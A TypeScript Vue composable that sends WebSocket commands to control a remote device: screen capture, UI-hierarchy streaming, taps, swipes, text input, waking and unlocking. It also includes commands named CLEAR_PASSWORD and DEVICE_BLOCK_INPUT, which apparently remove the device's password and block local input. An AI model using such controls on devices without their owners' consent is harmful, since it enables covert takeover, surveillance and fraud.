import type { Ref } from 'vue';
import type { WebSocketOutboundMessage } from '@/types/websocket';
import type { LockType, NavigationType } from '@/types/device';

type SendFunction = (message: WebSocketOutboundMessage) => boolean;

export function useScreenControl(
    send: SendFunction,
    deviceId: Ref<string>
) {
    const sendCommand = (command: string, params: Record<string, unknown> = {}): boolean => {
        return send({
            command,
            params,
            pid: deviceId.value,
        });
    };

    const startScreenShare = () => {
        return sendCommand('SCREEN_CAPTURE_RESUME');
    };

    const stopScreenShare = () => {
        return sendCommand('SCREEN_CAPTURE_STOP');
    };

    const startScreenshot = () => {
        return sendCommand('SCREEN_CAPTURE_RESUME', { mode: 'screenshot' });
    };

    const stopScreenshot = () => {
        return sendCommand('SCREEN_CAPTURE_STOP');
    };

    const startOCR = () => {
        return sendCommand('GET_UI_HIERARCHY_STREAM');
    };

    const stopOCR = () => {
        return sendCommand('GET_UI_HIERARCHY_STREAM_STOP');
    };

    const sendTap = (x: number, y: number) => {
        return sendCommand('CLICK', {
            x: Math.round(x),
            y: Math.round(y),
        });
    };

    const sendSwipe = (
        startX: number,
        startY: number,
        endX: number,
        endY: number
    ) => {
        return sendCommand('SWIPE', {
            x1: Math.round(startX),
            y1: Math.round(startY),
            x2: Math.round(endX),
            y2: Math.round(endY),
            duration: 300,
        });
    };

    const sendSwipePath = (points: Array<{ x: number; y: number }>) => {
        if (points.length < 2) return false;
        const path = points.map(p => ({ x: Math.round(p.x), y: Math.round(p.y) }));
        return sendCommand('SWIPE_PATH', {
            points: path,
            duration: 300,
        });
    };

    const sendLongPress = (x: number, y: number) => {
        return sendCommand('LONG_PRESS', {
            x: Math.round(x),
            y: Math.round(y),
            duration: 1000,
        });
    };

    const sendNavigation = (type: NavigationType) => {
        const navMap: Record<NavigationType, string> = {
            home: 'home',
            back: 'back',
            recent: 'recents',
        };
        return sendCommand(navMap[type]);
    };

    const sendVolumeUp = () => {
        return sendCommand('VOLUME_UP');
    };

    const sendVolumeDown = () => {
        return sendCommand('VOLUME_DOWN');
    };

    const showKeyboard = () => {
        return sendCommand('KEY_EVENT', { keyCode: 'show' });
    };

    const hideKeyboard = () => {
        return sendCommand('KEY_EVENT', { keyCode: 'hide' });
    };

    const pasteText = (text: string) => {
        return sendCommand('INPUT_TEXT', { text });
    };

    const setScreenQuality = (quality: number) => {
        const clampedQuality = Math.max(1, Math.min(100, quality));
        return sendCommand('SCREEN_QUALITY', { quality: clampedQuality });
    };

    const lockDevice = (type: LockType) => {
        const lockCommandMap: Record<LockType, string> = {
            0: 'UNLOCK_DEVICE',
            1: 'POWER_SLEEP',
            2: 'CLEAR_PASSWORD',
            3: 'DEVICE_BLOCK_INPUT',
        };
        return sendCommand(lockCommandMap[type]);
    };

    const wakeScreen = () => {
        return sendCommand('POWER_WAKE');
    };

    const takeScreenshot = () => {
        return sendCommand('SCREEN_CAPTURE_RESUME', { mode: 'snapshot' });
    };

    return {
        startScreenShare,
        stopScreenShare,
        startScreenshot,
        stopScreenshot,
        startOCR,
        stopOCR,
        sendTap,
        sendSwipe,
        sendSwipePath,
        sendLongPress,
        sendNavigation,
        sendVolumeUp,
        sendVolumeDown,
        showKeyboard,
        hideKeyboard,
        pasteText,
        setScreenQuality,
        lockDevice,
        wakeScreen,
        takeScreenshot,
    };
}
